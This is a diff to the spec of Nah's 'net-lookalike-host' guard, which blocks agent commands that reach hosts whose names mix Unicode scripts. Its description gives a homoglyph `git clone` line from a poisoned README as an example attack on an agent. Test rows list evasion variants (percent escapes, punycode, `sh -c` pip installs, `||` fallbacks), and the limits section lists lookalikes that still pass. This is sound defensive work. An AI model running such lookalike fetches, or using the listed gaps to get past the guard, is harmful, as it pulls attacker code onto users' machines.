@@ -5,19 +5,21 @@ This guard stops the agent from contacting a host whose name is built to pass
 for a trusted one. A poisoned README or issue can carry an install or clone
 line such as `git clone https://gіthub.com/org/repo`, where the `і` is
 Cyrillic: the name reads as GitHub, but it resolves to whoever registered it.
-It blocks any modeled download, upload, connection, or listener whose host has
-a DNS label that mixes Unicode scripts, following UTS #39. Digits, hyphens and
-combining marks belong to every script, Han written with Hiragana, Katakana,
-Hangul or Bopomofo counts as one writing system, and a punycode (`xn--`) label
-is decoded before it is judged. A fetch from the same host blocks inside
-`sh -c` and in a `||` fallback too.
+It blocks any modeled network access whose host has a DNS label that mixes
+Unicode scripts, following UTS #39 revision 34 (Unicode 18.0.0). Nah judges
+the name a URL client resolves: `%XX` escapes are decoded, then UTS #46
+mapping folds compatibility forms such as mathematical letters and decodes
+punycode (`xn--`) labels. Digits, hyphens and combining marks belong to every
+script, and Han written with Hiragana, Katakana, Hangul, Bopomofo or Latin
+counts as one writing system.
 '''
 
 limits = '''
 Nah judges the host the command names, with no reputation data or network
 lookup, so an all-Latin typo domain or a single-script lookalike such as an
 all-Cyrillic `аррӏе.com` passes. A host Nah cannot recover, such as a URL in
-an unset variable or the VCS URL of `pip install git+https://…`, delegates.
+an unset variable, a `git submodule add` URL, or a remote that `git push`
+reads from configuration, delegates.
 '''
 
 default_reason = '''
@@ -39,10 +41,6 @@ why = "curl saves a download from the mixed-script host."
 tui = true
 
 [[blocks]]
-row = "net-lookalike-host.curl-upload"
-why = "-T uploads a file to the mixed-script host."
-
-[[blocks]]
 row = "net-lookalike-host.punycode-git-clone"
 why = "xn--gthub-n2e decodes to the same Latin and Cyrillic label."
 tui = true
@@ -51,6 +49,14 @@ tui = true
 row = "net-lookalike-host.fallback-clone-mirror"
 why = "The clone after || reaches the mixed-script host when the first one fails."
 
+[[blocks]]
+row = "net-lookalike-host.percent-escaped-download"
+why = "curl decodes %D1%96 to the Cyrillic і before resolving the host."
+
+[[blocks]]
+row = "net-lookalike-host.sh-c-pip-vcs-install"
+why = "pip clones the git+https requirement from that host."
+
 [[passes]]
 row = "net-lookalike-host.ascii-host-delegates"
 why = "github.com is all Latin."
@@ -58,7 +64,7 @@ cause = "out-of-scope"
 
 [[passes]]
 row = "net-lookalike-host.latin-idn-delegates"
-why = "münchen is an internationalized label written entirely in Latin."
+why = "münchen is written entirely in Latin."
 cause = "out-of-scope"
 
 [[passes]]
@@ -68,5 +74,15 @@ cause = "out-of-scope"
 
 [[passes]]
 row = "net-lookalike-host.japanese-idn-delegates"
-why = "Han, Hiragana and Katakana together are one writing system, Japanese."
+why = "Han, Hiragana and Katakana together are Japanese, one writing system."
+cause = "out-of-scope"
+
+[[passes]]
+row = "net-lookalike-host.han-latin-label-delegates"
+why = "Han beside Latin is one writing system under UTS #39 revision 34."
+cause = "out-of-scope"
+
+[[passes]]
+row = "net-lookalike-host.ascii-host-unicode-fragment-delegates"
+why = "The Japanese text is the fragment; the host is all Latin."
 cause = "out-of-scope"
